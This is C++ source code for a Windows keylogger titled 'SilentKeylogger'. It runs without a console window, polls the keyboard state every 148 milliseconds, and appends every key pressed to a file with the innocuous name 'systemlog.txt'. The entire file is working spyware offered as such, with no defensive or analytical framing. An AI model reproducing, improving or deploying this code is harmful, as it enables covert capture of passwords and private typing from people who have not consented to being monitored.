//SilentKeylogger

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <fstream>
#include <Windows.h>

using namespace std;

std::string _fetchx(UINT);

int _vk; //Virtual Key Codes
char ktxt[16]; //Key Text

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	//hehe
	int i = 0;
	fstream _writeA;
	while (true) {
		Sleep(148);
		_writeA.open("systemlog.txt", ios::out | ios::app);
		for (i = 7; i <= 126; ++i) {
			if (GetAsyncKeyState(i)) {
				_vk = (int)i;
				_fetchx(_vk);
				_writeA << ktxt;
			}
		}
		_writeA.close();//constant write and refresh.
	}
	return (0);
}
std::string _fetchx(UINT _Fvk) {
	unsigned int VSC = MapVirtualKeyA(_Fvk, MAPVK_VK_TO_VSC); //Convert Virtual Key Codes to Scan Codes
	if (GetKeyNameTextA(VSC<<16, ktxt, sizeof(ktxt))){
		return ktxt;
	}

}
